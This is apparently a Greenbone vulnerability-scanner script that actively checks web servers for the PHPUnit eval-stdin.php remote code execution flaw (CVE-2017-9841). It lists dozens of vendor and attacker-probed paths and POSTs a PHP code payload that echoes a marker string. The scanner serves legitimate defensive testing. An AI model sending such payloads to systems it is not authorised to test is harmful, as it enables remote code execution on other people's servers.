# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108439");
  script_version("2024-07-16T05:05:43+0000");
  script_tag(name:"last_modification", value:"2024-07-16 05:05:43 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2018-04-14 15:29:22 +0200 (Sat, 14 Apr 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-14 16:39:00 +0000 (Tue, 14 Jan 2020)");
  script_cve_id("CVE-2017-9841");
  script_name("PHPUnit 'CVE-2017-9841' RCE Vulnerability (HTTP) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "gb_wordpress_http_detect.nasl",
                      "gb_drupal_http_detect.nasl", "gb_prestashop_http_detect.nasl",
                      "gb_mediawiki_http_detect.nasl", "gb_moodle_cms_detect.nasl",
                      "gb_owncloud_http_detect.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://web.archive.org/web/20190214092000/http://phpunit.vulnbusters.com/");
  script_xref(name:"URL", value:"https://thephp.cc/news/2020/02/phpunit-a-security-risk");
  script_xref(name:"URL", value:"https://github.com/sebastianbergmann/phpunit/commit/284a69fb88a2d0845d23f42974a583d8f59bf5a5");
  script_xref(name:"URL", value:"https://github.com/sebastianbergmann/phpunit/commit/33585d982b1e469a921020aa62446f64df63b900");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/101798");
  script_xref(name:"URL", value:"https://moodle.org/mod/forum/discuss.php?d=358588");
  script_xref(name:"URL", value:"https://lists.wikimedia.org/pipermail/mediawiki-announce/2017-November/000216.html");
  script_xref(name:"URL", value:"https://www.drupal.org/psa-2019-09-04");
  script_xref(name:"URL", value:"https://www.drupal.org/project/mailchimp/issues/2946280");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"PHPUnit is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the
  responses.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in the
  context of the user running the affected applications.");

  script_tag(name:"insight", value:"The flaw exists because Util/PHP/eval-stdin.php in PHPUnit
  allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a '<?php '
  substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external
  access to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.");

  script_tag(name:"affected", value:"- PHPUnit before 4.8.28 and 5.x before 5.6.3 in general.

  - PHPUnit before 7.5.19 and 8.x before 8.5.1 if running in a CGI / FastCGI context.

  The following products or their (3rdparty) modules are known to ship these affected versions:

  - Drupal

  - MediaWiki

  - Moodle

  - WordPress

  - PrestaShop

  - ownCloud (only 3rdparty apps)

  - Laravel");

  script_tag(name:"solution", value:"Update to PHPUnit 7.5.19, 8.5.1 or later. Some vendors shipping
  PHPUnit have released updates. Please see the references for more information.

  A possible mitigation is to delete the affected 'eval-stdin.php' file from the mentioned
  folder(s).");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_timeout(900);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

urls = make_list();

# nb: When adding new URLs here make sure to add the relevant dirs to DDI_Directory_Scanner.nasl

# First fill the known location of a few CMS and CMS plugins shipping these files.
wpdirs = get_app_location( port:port, cpe:"cpe:/a:wordpress:wordpress", nofork:TRUE );
if( wpdirs ) {
  foreach wpdir( wpdirs ) {
    if( wpdir == "/" ) wpdir = "";
    urls = make_list( urls,
                      # Seen in log files
                      wpdir + "/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/wp-rocket/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      # https://wordpress.org/support/topic/malicious-files-detected-in-plugin-after-installing/
                      wpdir + "/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

drdirs = get_app_location( port:port, cpe:"cpe:/a:drupal:drupal", nofork:TRUE );
if( drdirs ) {
  foreach drdir( drdirs ) {
    if( drdir == "/" ) drdir = "";
    urls = make_list( urls,
                      # https://www.drupal.org/project/mailchimp/issues/2946280
                      drdir + "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      drdir + "/sites/default/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# https://github.com/wikimedia/mediawiki/blob/1.30.0/maintenance/update.php#L173
mwdirs = get_app_location( port:port, cpe:"cpe:/a:mediawiki:mediawiki", nofork:TRUE );
if( mwdirs ) {
  foreach mwdir( mwdirs ) {
    if( mwdir == "/" ) mwdir = "";
    urls = make_list( urls,
                      mwdir + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# https://moodle.org/mod/forum/discuss.php?d=358588
modirs = get_app_location( port:port, cpe:"cpe:/a:moodle:moodle", nofork:TRUE );
if( modirs ) {
  foreach modir( modirs ) {
    if( modir == "/" ) modir = "";
    urls = make_list( urls,
                      modir + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# https://build.prestashop.com/news/critical-security-vulnerability-in-prestashop-modules/
# nb: This link discusses a newer vulnerability but shows a few modules which might be affected by this older vulnerability as well.
psdirs = get_app_location( port:port, cpe:"cpe:/a:prestashop:prestashop", nofork:TRUE );
if( psdirs ) {
  foreach psdir( psdirs ) {
    if( psdir == "/" ) psdir = "";
    urls = make_list( urls,
                      psdir + "/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      psdir + "/modules/pscartabandonmentpro/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      psdir + "/modules/ps_facetedsearch/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      psdir + "/modules/gamification/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      psdir + "/modules/ps_checkout/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# nb: ownCloud itself isn't affected, have only seen two 3rdparty apps shipping phpunit
ocdirs = get_app_location( port:port, cpe:"cpe:/a:owncloud:owncloud", nofork:TRUE );
if( ocdirs ) {
  foreach ocdir( ocdirs ) {
    if( ocdir == "/" ) ocdir = "";
    urls = make_list( urls,
                      ocdir + "/apps-external/polls/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      ocdir + "/apps/polls/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

files = make_list(
# Installed via composer
"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
# Directly used / installed or additional known locations
"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/vendor/phpunit/src/Util/PHP/eval-stdin.php",
"/vendor/phpunit/Util/PHP/eval-stdin.php",
"/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/phpunit/src/Util/PHP/eval-stdin.php",
"/phpunit/Util/PHP/eval-stdin.php",
"/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/lib/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/Util/PHP/eval-stdin.php",
# Shipped with "ajaxplorer" Plugin for CKEditor
"/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php",
"/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php",
# To additional check the file in all detected directories.
"/eval-stdin.php" );

#nb: The final list with the directories from webmirror.nasl and DDI_Directory_Scanner.nasl.
foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" ) dir = "";
  foreach file( files ) {
    urls = make_list( urls, file );
  }
}

# Additional files seen in log files during current (04/2020, 07/2020, 11/2020, 05/2021 and 12/2023) attacks
urls = make_list( urls,
# 12/2023:
"/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
# 05/2021:
"/mailgun-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
# 11/2020:
"/modules/gamification/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", # nb: Prestashop, just adding the default here if Prestashop (see above) wasn't detected
"/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", # nb: Drupal, just adding the default here if Drupal (see above) wasn't detected
# 07/2020:
"/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php",
# 04/2020:
"/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/Util/PHP/eval-stdin.php",
"/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
# Some additional files seen in other scanners
"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );

# ...and make it "unique" so we don't check duplicated folders
urls = make_list_unique( urls );

vtstrings = get_vt_strings();
check = vtstrings["default"] + " RCE Test";
check64 = base64( str:check );
data = '<?php echo(base64_decode("' + check64 + '"));';

foreach url( urls ) {

  req = http_post_put_req( port:port, url:url, data:data,
                           accept_header:"*/*",
                           add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( res && check >< res ) {

    info['"HTTP POST" body'] = data;
    info["URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );

    report  = 'By doing the following request:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += 'it was possible to execute the "echo" command.';
    report += '\n\nResult:\n\n' + res;

    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
    security_message( port:port, data:report, expert_info:expert_info );
    exit( 0 );
  }
}

exit( 99 );
